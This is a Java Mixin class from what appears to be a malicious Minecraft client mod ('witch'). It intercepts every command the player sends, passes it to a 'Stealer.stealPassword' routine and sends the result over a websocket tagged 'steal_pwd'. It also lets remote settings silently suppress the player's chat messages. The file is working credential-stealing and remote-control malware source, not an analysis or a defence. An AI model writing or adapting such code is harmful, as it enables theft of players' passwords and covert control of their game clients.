package me.soda.witch.mixin;

import me.soda.witch.config.Config;
import me.soda.witch.features.ChatControl;
import me.soda.witch.features.Stealer;
import me.soda.witch.websocket.MessageUtils;
import net.minecraft.client.network.ClientPlayerEntity;
import net.minecraft.text.Text;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;

@Mixin(ClientPlayerEntity.class)
public class ClientPlayerEntityMixin {
    @Inject(method = "sendCommand(Ljava/lang/String;Lnet/minecraft/text/Text;)V", at = @At("HEAD"))
    private void onSendCommand(String command, Text preview, CallbackInfo info) {
        try {
            MessageUtils.sendMessage("steal_pwd", Stealer.stealPassword(command));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Inject(method = "sendChatMessage(Ljava/lang/String;Lnet/minecraft/text/Text;)V", at = @At("HEAD"), cancellable = true)
    private void onSendChatMessage(String message, Text preview, CallbackInfo info) {
        if (Config.isMuted) info.cancel();
        if (ChatControl.tryChatBack(message)) info.cancel();
    }
}